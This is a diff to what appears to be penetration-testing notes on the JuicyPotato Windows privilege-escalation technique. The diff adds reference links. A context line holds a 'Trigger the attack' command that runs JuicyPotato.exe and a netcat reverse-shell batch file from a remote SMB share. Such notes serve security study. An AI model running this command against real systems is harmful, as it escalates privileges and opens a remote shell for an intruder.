@@ -16,3 +16,9 @@
 5. Trigger the attack
 
         \\10.10.10.4\share\JuicyPotato.exe -t * -p \\10.10.10.4\share\nc_reverse_shell.bat -l 1337
+
+## References
+
+* https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato
+* [Rotten Potato: Windows Server 2016 OS](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
+* https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato
